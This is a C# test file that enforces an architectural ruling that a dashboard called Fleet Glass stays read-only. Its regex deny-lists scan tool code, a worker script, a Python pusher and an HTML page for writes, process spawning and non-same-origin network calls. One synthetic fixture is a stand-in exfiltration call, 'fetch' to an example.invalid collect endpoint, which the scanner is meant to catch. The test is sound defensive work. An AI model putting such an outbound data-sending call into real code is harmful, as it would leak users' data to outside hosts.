using System.Text.RegularExpressions;

namespace Baton.Architecture.Tests;

/// <summary>
/// #1602: Fleet Glass is read-only by architectural decision (ratified; independently flagged by two
/// external reviews as load-bearing: observability planes accrete cancel/retry/settle buttons and
/// become a second actor in the state machine).
/// <para>
/// <b>What this checks:</b>
/// <list type="number">
/// <item>The MCP tools consumed by the glass (<c>fleet_status</c>, <c>room_detail</c>,
/// <c>deliverables_list</c>, <c>deliverable_read</c>) invoke no mutating API: no journal append
/// (<c>FlowEventLogWriter</c>), no cancel/redispatch/dispatch entry point, no request-file write, and
/// no mutating sentinel write.</item>
/// <item><c>tools/fleet-glass/worker.js</c> registers only read-only tools with <c>readOnlyHint: true</c>
/// and makes no outbound requests to the fleet machine.</item>
/// <item><c>tools/fleet-glass/pusher.py</c> spawns only read-only tools and invokes no mutating baton
/// verbs or room command POSTs.</item>
/// <item><c>tools/fleet-glass/glass.html</c> performs no mutating network requests or tool calls; its only
/// "verbs" are clipboard copies (<c>navigator.clipboard.writeText</c>). Since #1946 the page has a
/// second delivery (served by <c>baton daemon</c> over the tailnet, spec/baton.md §11 C-11) and reads
/// same-origin there; the scan's own comment carries exactly which predicate that changed and why the
/// read-only ruling below is unaffected by it.</item>
/// </list>
/// </para>
/// <para>
/// <b>Ruling:</b> The Fleet Glass surface is read-only by decision (issue #1602). Observability planes
/// must not accrete mutating buttons or actions to become a second actor in the state machine. A button
/// or mutating action on the glass is an amendment to this decision, not a gap to fix.
/// </para>
/// </summary>
public class FleetGlassReadOnlyTests
{
    private const string RulingMessagePrefix =
        "Fleet Glass is read-only by architectural decision (issue #1602): observability planes must not " +
        "accrete mutating buttons or actions to become a second actor in the state machine. A button or mutating " +
        "action on the glass is an amendment to this decision, not a gap to fix.\n\n";

    // MCP tool implementation files in C# consumed by the fleet glass pipeline.
    private static readonly string[] GlassMcpToolFiles =
    [
        "src/Baton.Cli/Mcp/FleetStatusTool.cs",
        "src/Baton.Cli/Mcp/RoomDetailTool.cs",
    ];

    // Transitive dependencies / helper files directly underlying the read-only MCP tools.
    private static readonly string[] GlassMcpToolDependencyFiles =
    [
        "src/Baton/Store/FlowEventLogReader.cs",
        "src/Baton/Projection/ProjectionCheckpointStore.cs",
        "src/Baton/Status/RoomRegistryStore.cs",
        "src/Baton/Status/TerminalSentinelWriter.cs",
        "src/Baton.Vendors/WorkerBindingConfigParser.cs",
        "src/Baton/Templates/SnapshotBinder.cs",
        "src/Baton/Status/StandardWorkerUsageParsers.cs",
        "src/Baton/Projection/StateProjector.cs",
    ];

    // Mutating API patterns forbidden from being called by the glass read tools.
    private static readonly (string Pattern, string Description)[] ForbiddenMutatingApis =
    [
        // Journal appends
        (@"\bFlowEventLogWriter\b", "FlowEventLogWriter (journal mutation)"),
        (@"\bCoreEventLogWriter\b", "CoreEventLogWriter (journal mutation)"),
        (@"\bRoomEventLogWriter\b", "RoomEventLogWriter (journal mutation)"),
        (@"\bEventLogWriter\b", "EventLogWriter (journal mutation)"),
        (@"\.AppendEntryAsync\(", "journal append API"),
        (@"\.AppendEntry\(", "journal append API"),

        // Mutating command / runner entry points
        (@"\bCancelCommand\b", "CancelCommand entry point"),
        (@"\bCancelRunner\b", "CancelRunner entry point"),
        (@"\bCancelOptionsParser\b", "CancelOptionsParser"),
        (@"\bCancelRequestFile\b", "CancelRequestFile mutation"),
        (@"\bExecutionCanceller\b", "ExecutionCanceller mutation"),
        (@"\bRedispatchCommand\b", "RedispatchCommand entry point"),
        (@"\bRedispatchRunner\b", "RedispatchRunner entry point"),
        (@"\bRedispatchOptionsParser\b", "RedispatchOptionsParser"),
        (@"\bDispatchCommand\b", "DispatchCommand entry point"),
        (@"\bDispatchRunner\b", "DispatchRunner entry point"),
        (@"\bDispatchOptionsParser\b", "DispatchOptionsParser"),
        (@"\bRunCommand\b", "RunCommand entry point"),
        (@"\bRunRunner\b", "RunRunner entry point"),
        (@"\bResumeCommand\b", "ResumeCommand entry point"),
        (@"\bResumeRunner\b", "ResumeRunner entry point"),
        (@"\bDecideCommand\b", "DecideCommand entry point"),
        (@"\bDecideRunner\b", "DecideRunner entry point"),
        (@"\bSupplyCommand\b", "SupplyCommand entry point"),
        (@"\bSupplyRunner\b", "SupplyRunner entry point"),
        (@"\bKeepCommand\b", "KeepCommand entry point"),
        (@"\bCoreDispatcher\b", "CoreDispatcher spawn entry point"),
        (@"\bWorktreeProvisioner\b", "WorktreeProvisioner mutation"),

        // Request file write
        (@"\bExecutionRequestWriter\b", "ExecutionRequestWriter mutation"),
        (@"\bWriteExecutionRequest\b", "request-file write API"),

        // Sentinel writes (TerminalSentinelWriter.TryReadAsync is permitted; Write* is forbidden)
        (@"TerminalSentinelWriter\.WriteAsync\(", "TerminalSentinelWriter.WriteAsync"),
        (@"TerminalSentinelWriter\.WriteValidationRefusedAsync\(", "TerminalSentinelWriter.WriteValidationRefusedAsync"),

        // Direct mutating file system calls
        (@"File\.WriteAllText(?:Async)?\(", "File.WriteAllText"),
        (@"File\.WriteAllBytes(?:Async)?\(", "File.WriteAllBytes"),
        (@"File\.WriteAllLines(?:Async)?\(", "File.WriteAllLines"),
        (@"File\.AppendAllText(?:Async)?\(", "File.AppendAllText"),
        (@"File\.AppendAllLines(?:Async)?\(", "File.AppendAllLines"),
        (@"File\.Create(?:SymbolicLink)?\(", "File.Create"),
        (@"File\.OpenWrite\(", "File.OpenWrite"),
        (@"File\.Delete\(", "File.Delete"),
        (@"Directory\.Delete\(", "Directory.Delete"),
        (@"Directory\.CreateDirectory\(", "Directory.CreateDirectory"),
        (@"new\s+FileStream\s*\([^;]*FileAccess\.(?:Write|ReadWrite)", "FileStream with write access"),
        (@"new\s+FileStream\s*\([^;]*FileMode\.(?:Create|CreateNew|Append|Truncate)", "FileStream with mutating FileMode"),
    ];

    [Fact]
    public void Mcp_tools_consumed_by_fleet_glass_invoke_no_mutating_apis()
    {
        var root = RepoRoot();
        var violations = new List<string>();

        foreach (var relativePath in GlassMcpToolFiles)
        {
            var fullPath = Path.Combine(root, relativePath);
            Assert.True(File.Exists(fullPath), $"Expected tool source file at {relativePath}");

            var code = StripComments(File.ReadAllText(fullPath));

            foreach (var (pattern, description) in ForbiddenMutatingApis)
            {
                if (Regex.IsMatch(code, pattern))
                {
                    violations.Add($"{relativePath} matches forbidden mutating pattern: {description} (pattern: `{pattern}`)");
                }
            }
        }

        Assert.True(
            violations.Count == 0,
            RulingMessagePrefix +
            "The MCP tool implementations consumed by Fleet Glass must not invoke mutating APIs. Violations:\n  " +
            string.Join("\n  ", violations));
    }

    [Fact]
    public void Mcp_tools_consumed_by_fleet_glass_advertise_read_only_hint()
    {
        var root = RepoRoot();
        var violations = new List<string>();

        foreach (var relativePath in GlassMcpToolFiles)
        {
            var fullPath = Path.Combine(root, relativePath);
            Assert.True(File.Exists(fullPath), $"Expected tool source file at {relativePath}");

            var rawCode = File.ReadAllText(fullPath);
            if (!rawCode.Contains("\"readOnlyHint\": true", StringComparison.Ordinal))
            {
                violations.Add($"{relativePath} does not advertise AnnotationsJson with `\"readOnlyHint\": true`");
            }
        }

        Assert.True(
            violations.Count == 0,
            RulingMessagePrefix +
            "Every MCP tool consumed by Fleet Glass must declare readOnlyHint: true. Violations:\n  " +
            string.Join("\n  ", violations));
    }

    [Fact]
    public void Transitive_dependencies_of_glass_mcp_tools_invoke_no_unapproved_mutating_apis()
    {
        var root = RepoRoot();
        var violations = new List<string>();

        // For dependencies, we check mutating command/dispatch/cancel entry points and request writes.
        // (Note: TerminalSentinelWriter.cs implements WriteAsync for other callers, but the tool only calls TryReadAsync).
        var dependencyForbiddenApis = ForbiddenMutatingApis
            .Where(x => !x.Description.Contains("TerminalSentinelWriter.")
                     && !x.Description.Contains("File.Create")
                     && !x.Description.Contains("File.Write")
                     && !x.Description.Contains("File.Append")
                     && !x.Description.Contains("File.Delete")
                     && !x.Description.Contains("Directory.Delete")
                     && !x.Description.Contains("Directory.CreateDirectory")
                     && !x.Description.Contains("FileStream"))
            .ToList();

        foreach (var relativePath in GlassMcpToolDependencyFiles)
        {
            var fullPath = Path.Combine(root, relativePath);
            Assert.True(File.Exists(fullPath), $"dependency listed but missing: {relativePath}");

            var code = StripComments(File.ReadAllText(fullPath));

            foreach (var (pattern, description) in dependencyForbiddenApis)
            {
                if (Regex.IsMatch(code, pattern))
                {
                    violations.Add($"{relativePath} matches forbidden mutating pattern: {description} (pattern: `{pattern}`)");
                }
            }
        }

        Assert.True(
            violations.Count == 0,
            RulingMessagePrefix +
            "Dependencies of Fleet Glass MCP tools must not reference mutating entry points. Violations:\n  " +
            string.Join("\n  ", violations));
    }

    [Fact]
    public void Fleet_glass_worker_declares_only_read_only_tools_and_no_outbound_calls()
    {
        var root = RepoRoot();
        var workerPath = Path.Combine(root, "tools", "fleet-glass", "worker.js");
        Assert.True(File.Exists(workerPath), "worker.js must exist at tools/fleet-glass/worker.js");

        var code = File.ReadAllText(workerPath);
        var codeWithoutComments = StripComments(code);

        // 1. Extract the TOOLS array definition
        var toolsMatch = Regex.Match(codeWithoutComments, @"const\s+TOOLS\s*=\s*\[(.*?)\];", RegexOptions.Singleline);
        Assert.True(toolsMatch.Success, "worker.js must declare a `const TOOLS = [...];` array");

        var toolsBlock = toolsMatch.Groups[1].Value;

        var approvedTools = new HashSet<string>(StringComparer.Ordinal)
        {
            "fleet_status",
            "deliverables_list",
            "deliverable_read",
        };

        var toolNameMatches = Regex.Matches(toolsBlock, @"name:\s*""([^""]+)""");
        Assert.True(toolNameMatches.Count > 0, "worker.js must declare tool names in TOOLS array");

        var declaredTools = toolNameMatches.Select(m => m.Groups[1].Value).ToList();
        var unapprovedTools = declaredTools.Where(name => !approvedTools.Contains(name)).ToList();

        Assert.True(
            unapprovedTools.Count == 0,
            RulingMessagePrefix +
            $"worker.js declares unapproved/mutating tools in TOOLS array: [{string.Join(", ", unapprovedTools)}]. " +
            $"Only read-only tools [{string.Join(", ", approvedTools)}] are permitted.");

        // 2. All registered tools must declare readOnlyHint: true
        var readOnlyHintMatches = Regex.Matches(toolsBlock, @"readOnlyHint:\s*true");
        Assert.True(
            readOnlyHintMatches.Count == declaredTools.Count,
            RulingMessagePrefix +
            $"Every tool registered in worker.js TOOLS array must declare `readOnlyHint: true`. Found {readOnlyHintMatches.Count}, expected {declaredTools.Count}.");

        // 3. handleMcp must only handle approved tools
        var handleMcpMatch = Regex.Match(codeWithoutComments, @"async\s+function\s+handleMcp\s*\([^)]*\)\s*\{(.*?)\n\}", RegexOptions.Singleline);
        Assert.True(handleMcpMatch.Success, "worker.js must contain handleMcp function");

        var handledTools = Regex.Matches(handleMcpMatch.Groups[1].Value, @"name\s*===\s*""([^""]+)""")
            .Select(m => m.Groups[1].Value)
            .ToList();

        var unapprovedHandledTools = handledTools.Where(t => !approvedTools.Contains(t)).ToList();
        Assert.True(
            unapprovedHandledTools.Count == 0,
            RulingMessagePrefix +
            $"worker.js handleMcp handles unapproved tool names: [{string.Join(", ", unapprovedHandledTools)}]");

        // 4. worker.js must not contain mutating verbs, process execution, or outbound network fetch calls
        var forbiddenWorkerPatterns = new[]
        {
            (@"(?<!async\s+)\bfetch\s*\(", "outbound fetch() call (worker must be inbound-only response host)"),
            (@"\bexec\s*\(", "process execution"),
            (@"\bspawn\s*\(", "process spawn"),
            (@"\b(cancel|redispatch|dispatch|run|decide|resume)\b.*TOOLS", "mutating verb in tool registration"),
        };

        var violations = new List<string>();
        foreach (var (pattern, desc) in forbiddenWorkerPatterns)
        {
            if (Regex.IsMatch(codeWithoutComments, pattern, RegexOptions.IgnoreCase))
            {
                violations.Add($"worker.js: {desc} (pattern: `{pattern}`)");
            }
        }

        Assert.True(
            violations.Count == 0,
            RulingMessagePrefix +
            "worker.js must not perform outbound calls or register mutating tools:\n  " +
            string.Join("\n  ", violations));
    }

    [Fact]
    public void Fleet_glass_pusher_invokes_no_mutating_verbs_or_room_command_posts()
    {
        var root = RepoRoot();
        var pusherPath = Path.Combine(root, "tools", "fleet-glass", "pusher.py");
        Assert.True(File.Exists(pusherPath), "pusher.py must exist at tools/fleet-glass/pusher.py");

        var rawCode = File.ReadAllText(pusherPath);
        var codeWithoutComments = StripComments(rawCode);

        var violations = new List<string>();

        // 1. Pusher only runs `baton mcp` with read-only flags
        if (!codeWithoutComments.Contains("--fleet-status-tool", StringComparison.Ordinal)
            || !codeWithoutComments.Contains("--room-detail-tool", StringComparison.Ordinal))
        {
            violations.Add("pusher.py does not invoke expected read-only MCP tools (--fleet-status-tool, --room-detail-tool)");
        }

        // 2. Pusher must NOT invoke mutating flags or verbs
        var forbiddenPusherFlags = new[]
        {
            "--memory-proposal-tool",
            "--capture-file",
            "\"run\"",
            "'run'",
            "\"dispatch\"",
            "'dispatch'",
            "\"redispatch\"",
            "'redispatch'",
            "\"cancel\"",
            "'cancel'",
            "\"decide\"",
            "'decide'",
            "\"resume\"",
            "'resume'",
            "\"supply\"",
            "'supply'",
            "\"keep\"",
            "'keep'",
            "\"unkeep\"",
            "'unkeep'",
            "\"sweep\"",
            "'sweep'",
        };

        foreach (var flag in forbiddenPusherFlags)
        {
            // Check in code outside comments and selftest fixture text
            var codeOutsideSelftest = ExtractCodeExcludingSelftest(codeWithoutComments);
            if (Regex.IsMatch(codeOutsideSelftest, @"\b" + Regex.Escape(flag.Trim('"', '\'')) + @"\b")
                && codeOutsideSelftest.Contains(flag, StringComparison.Ordinal))
            {
                violations.Add($"pusher.py references forbidden mutating flag/subcommand: {flag}");
            }
        }

        // 3. Pusher POSTs only to mailbox endpoints (push_url, deliver_url, heartbeat_url), never into rooms or localhost
        var localPostMatches = Regex.Matches(
            codeWithoutComments,
            @"https?://(?:localhost|127\.0\.0\.1|0\.0\.0\.0)(?::\d+)?(?:/[^\s""']*)?",
            RegexOptions.IgnoreCase);

        foreach (Match match in localPostMatches)
        {
            violations.Add($"pusher.py references local room/host network destination: {match.Value}");
        }

        Assert.True(
            violations.Count == 0,
            RulingMessagePrefix +
            "pusher.py must invoke only read-only MCP tools and POST outbound state only to the mailbox worker:\n  " +
            string.Join("\n  ", violations));
    }

    [Fact]
    public void Fleet_glass_html_performs_no_mutating_actions_and_restricts_verbs_to_clipboard_copies()
    {
        var root = RepoRoot();
        var glassPath = Path.Combine(root, "tools", "fleet-glass", "glass.html");
        Assert.True(File.Exists(glassPath), "glass.html must exist at tools/fleet-glass/glass.html");

        var rawHtml = File.ReadAllText(glassPath);
        var violations = new List<string>();

        // 1. Verify no MUTATING network request sinks in glass.html.
        //
        // #1946 amended this list, and it is worth being exact about what changed. This method's own
        // summary always stated the intent as "performs no MUTATING network requests or tool calls";
        // the implementation over-approximated that to "no network requests at all", which was a free
        // and correct proxy for as long as the Claude.ai artifact was the only delivery and the page
        // therefore had no origin to read from. C-11's tailnet plane gives it one: the daemon serves
        // the same file and the page reads `/projection.json` and subscribes to `/events`
        // same-origin. That is the predicate being brought back in line with the stated intent -- the
        // read-only DECISION is untouched, and the rules below are what now enforce it:
        //   - any HTTP method other than GET is forbidden outright (a `method:` key naming anything
        //     but GET), which is what actually distinguishes a read from a mutation;
        //   - the transports that cannot be constrained to a same-origin GET stay forbidden
        //     (XMLHttpRequest, sendBeacon, jQuery.ajax, WebSocket, <form method=post>);
        //   - every `fetch(` / `new EventSource(` first argument must be a relative "/..." string
        //     literal, so the page cannot reach any origin but the one that served it. A variable or
        //     a template literal is refused too: a URL this test cannot read is a URL it cannot pin.
        var forbiddenNetworkSinks = new[]
        {
            (@"\bmethod\s*:\s*[""'](?!GET[""'])[A-Za-z]+[""']", "non-GET HTTP method (mutating request)"),
            (@"\bXMLHttpRequest\b", "XMLHttpRequest API"),
            (@"\$\.ajax\b", "jQuery ajax call"),
            (@"\bnavigator\.sendBeacon\b", "navigator.sendBeacon API"),
            (@"\bnew\s+WebSocket\b", "WebSocket creation"),
            (@"<form\b[^>]*\bmethod\s*=\s*[""']?post[""']?", "<form method='POST'> HTML element"),
        };

        var htmlWithoutComments = StripHtmlAndJsComments(rawHtml);

        foreach (var (pattern, description) in forbiddenNetworkSinks)
        {
            if (Regex.IsMatch(htmlWithoutComments, pattern, RegexOptions.IgnoreCase))
            {
                violations.Add($"glass.html contains forbidden network sink: {description} (pattern: `{pattern}`)");
            }
        }

        violations.AddRange(SameOriginReadViolations(htmlWithoutComments));

        // 2. Verify no mutating MCP tool calls (only watchTool with approved tools is permitted)
        var forbiddenMcpCallPatterns = new[]
        {
            (@"\bcallTool\s*\(", "mcp.callTool() invocation"),
            (@"watchTool\s*\(\s*[""'][^""']+[""']\s*,\s*[""'](?!fleet_status|deliverables_list|deliverable_read)[^""']+[""']", "watchTool with non-approved tool"),
        };

        foreach (var (pattern, description) in forbiddenMcpCallPatterns)
        {
            if (Regex.IsMatch(htmlWithoutComments, pattern))
            {
                violations.Add($"glass.html contains unapproved MCP tool call: {description}");
            }
        }

        // 3. Scan for mutating verb strings and verify they are strictly allowlisted to copy buttons
        // Approved mutating verb strings in glass.html:
        // - "baton redispatch" inside copyButtonsHtml
        // - "baton cancel" inside copyButtonsHtml
        // Extract copyButtonsHtml function to confirm that is where mutating verb strings reside.
        var copyButtonsFunctionMatch = Regex.Match(
            htmlWithoutComments,
            @"function\s+copyButtonsHtml\s*\([^)]*\)\s*\{.*?\n\}",
            RegexOptions.Singleline);
        Assert.True(copyButtonsFunctionMatch.Success, "glass.html must define `function copyButtonsHtml`");

        var copyButtonsBody = copyButtonsFunctionMatch.Value;

        // Strip copyButtonsHtml out of the remaining HTML and verify no other mutating verb strings exist
        var htmlWithoutCopyButtons = htmlWithoutComments.Replace(copyButtonsBody, string.Empty, StringComparison.Ordinal);

        var mutatingVerbs = new[]
        {
            "baton run",
            "baton dispatch",
            "baton redispatch",
            "baton cancel",
            "baton decide",
            "baton resume",
            "baton supply",
            "baton keep",
            "baton unkeep",
            "baton sweep",
        };

        foreach (var verb in mutatingVerbs)
        {
            if (htmlWithoutCopyButtons.Contains(verb, StringComparison.Ordinal))
            {
                violations.Add($"glass.html contains unapproved mutating verb string `{verb}` outside copyButtonsHtml");
            }
        }

        // Also verify that copyButtonsHtml strictly uses copyButtonHtml which routes to clipboard
        Assert.Contains("copyButtonHtml", copyButtonsBody, StringComparison.Ordinal);
        Assert.Contains("copy redispatch", copyButtonsBody, StringComparison.Ordinal);
        Assert.Contains("copy cancel", copyButtonsBody, StringComparison.Ordinal);

        // Verify that click listener on .copybtn routes ONLY to copyToClipboard
        var clickListenerMatch = Regex.Match(
            htmlWithoutComments,
            @"document\.addEventListener\s*\(\s*[""']click[""']\s*,\s*async\s*\([^)]*\)\s*=>\s*\{.*?\bcopyToClipboard\s*\(.*?\n\}\);",
            RegexOptions.Singleline);
        Assert.True(clickListenerMatch.Success, "glass.html must wire .copybtn clicks exclusively to copyToClipboard");

        Assert.True(
            violations.Count == 0,
            RulingMessagePrefix +
            "glass.html must perform no mutating network calls or MCP tool executions, and any mutating verbs " +
            "must strictly reside in clipboard copy buttons. Violations:\n  " +
            string.Join("\n  ", violations));
    }

    [Fact]
    public void The_read_only_scanners_discriminate_mutating_violations_on_synthetic_fixtures()
    {
        // 1. Synthetic C# mutating code is caught by MCP tool scanner
        var syntheticMutatingCSharp = """
            public class BadTool : IMcpTool {
                public async Task CallAsync() {
                    var writer = new FlowEventLogWriter("flow.jsonl");
                    await writer.AppendEntryAsync(null);
                    await CancelCommand.ExecuteAsync(null, null);
                    File.WriteAllText("output.txt", "mutated");
                }
            }
            """;

        var detectedCSharpViolations = new List<string>();
        foreach (var (pattern, desc) in ForbiddenMutatingApis)
        {
            if (Regex.IsMatch(syntheticMutatingCSharp, pattern))
            {
                detectedCSharpViolations.Add(desc);
            }
        }

        Assert.True(detectedCSharpViolations.Count >= 3, "Scanner must detect multiple mutating patterns in synthetic C# code.");
        Assert.Contains(detectedCSharpViolations, v => v.Contains("FlowEventLogWriter"));
        Assert.Contains(detectedCSharpViolations, v => v.Contains("CancelCommand"));
        Assert.Contains(detectedCSharpViolations, v => v.Contains("File.WriteAllText"));

        // 2. Synthetic HTML with fetch POST or callTool is caught by HTML scanner
        var syntheticMutatingHtml = """
            <div>
              <button onclick="fetch('/api/cancel', { method: 'POST' })">Cancel</button>
              <button onclick="claude.use('mcp').then(m => m.callTool('baton', 'cancel', {}))">Cancel via MCP</button>
            </div>
            """;

        var detectedHtmlViolations = new List<string>();
        // #1946: `fetch(` alone is no longer the tell -- a same-origin GET is now permitted, so the
        // control has to prove the NARROWER rules still discriminate. The POST above is caught by the
        // method rule; the absolute-URL read below is caught by the same-origin rule.
        if (Regex.IsMatch(syntheticMutatingHtml, @"\bmethod\s*:\s*[""'](?!GET[""'])[A-Za-z]+[""']", RegexOptions.IgnoreCase))
        {
            detectedHtmlViolations.Add("non-GET method");
        }
        if (Regex.IsMatch(syntheticMutatingHtml, @"\bcallTool\s*\("))
        {
            detectedHtmlViolations.Add("callTool");
        }

        Assert.Equal(2, detectedHtmlViolations.Count);

        // Polarity in both directions, on the two rules #1946 introduced: the permitted shape must
        // pass and each forbidden shape must fail, or the amendment above has simply deleted a check.
        Assert.Empty(SameOriginReadViolations(
            """
            const load = () => fetch("/projection.json", { cache: "no-store" });
            const events = new EventSource("/events");
            """));
        Assert.NotEmpty(SameOriginReadViolations(
            """const exfiltrate = () => fetch("https://example.invalid/collect");"""));
        Assert.NotEmpty(SameOriginReadViolations(
            """const events = new EventSource(someOperatorSuppliedUrl);"""));
        Assert.False(
            Regex.IsMatch(
                """fetch("/projection.json", { method: "GET" })""",
                @"\bmethod\s*:\s*[""'](?!GET[""'])[A-Za-z]+[""']",
                RegexOptions.IgnoreCase),
            "An explicit GET must not read as a mutating method.");

        // 3. Synthetic Python code with mutating command is caught by Python scanner
        var syntheticMutatingPython = """
            import subprocess
            def cancel_room(room_dir):
                subprocess.run(["baton", "cancel", room_dir])
            """;

        Assert.True(
            syntheticMutatingPython.Contains("\"cancel\"", StringComparison.Ordinal)
            && Regex.IsMatch(syntheticMutatingPython, @"\bcancel\b"),
            "Scanner must flag mutating verb in synthetic Python code.");
    }

    /// <summary>
    /// #1946 — every <c>fetch(</c> and <c>new EventSource(</c> in <paramref name="script"/> whose first
    /// argument is not a same-origin relative path literal (<c>"/..."</c> or <c>'/...'</c>). Shared by
    /// the real scan and by its synthetic control, so the control exercises the same code the scan
    /// runs rather than a re-typed approximation of it.
    /// </summary>
    private static List<string> SameOriginReadViolations(string script)
    {
        var violations = new List<string>();
        foreach (Match match in Regex.Matches(script, @"(?:\bfetch|\bnew\s+EventSource)\s*\(\s*([^,)]*)"))
        {
            var argument = match.Groups[1].Value.Trim();
            if (!Regex.IsMatch(argument, @"^(""|')/"))
            {
                violations.Add(
                    $"glass.html reads from a non-same-origin or unreadable URL: `{match.Value.Trim()}` — every " +
                    "fetch()/EventSource() first argument must be a relative \"/...\" string literal");
            }
        }

        return violations;
    }

    private static string StripComments(string code)
    {
        // Strip block comments /* ... */ and line comments // ... or # ...
        var withoutBlockComments = Regex.Replace(code, @"/\*.*?\*/", string.Empty, RegexOptions.Singleline);
        var withoutLineComments = Regex.Replace(withoutBlockComments, @"//.*?$", string.Empty, RegexOptions.Multiline);
        var withoutPythonComments = Regex.Replace(withoutLineComments, @"#.*?$", string.Empty, RegexOptions.Multiline);
        return withoutPythonComments;
    }

    private static string StripHtmlAndJsComments(string html)
    {
        // Strip HTML comments <!-- ... -->
        var withoutHtmlComments = Regex.Replace(html, @"<!--.*?-->", string.Empty, RegexOptions.Singleline);
        // Strip JS block comments /* ... */
        var withoutJsBlockComments = Regex.Replace(withoutHtmlComments, @"/\*.*?\*/", string.Empty, RegexOptions.Singleline);
        // Strip JS line comments // ...
        var withoutJsLineComments = Regex.Replace(withoutJsBlockComments, @"//.*?$", string.Empty, RegexOptions.Multiline);
        return withoutJsLineComments;
    }

    private static string ExtractCodeExcludingSelftest(string code)
    {
        var selftestIndex = code.IndexOf("def _selftest()", StringComparison.Ordinal);
        return selftestIndex >= 0 ? code[..selftestIndex] : code;
    }

    private static string GetSurroundingContext(string text, int index, int radius)
    {
        var start = Math.Max(0, index - radius);
        var length = Math.Min(text.Length - start, radius * 2);
        return text.Substring(start, length).Replace("\r", " ").Replace("\n", " ");
    }

    private static string RepoRoot()
    {
        var dir = new DirectoryInfo(AppContext.BaseDirectory);
        while (dir is not null)
        {
            if (File.Exists(Path.Combine(dir.FullName, "Baton.slnx")))
            {
                return dir.FullName;
            }

            dir = dir.Parent;
        }

        throw new FileNotFoundException(
            "Could not locate the repo root (Baton.slnx) by walking up from " + AppContext.BaseDirectory);
    }
}
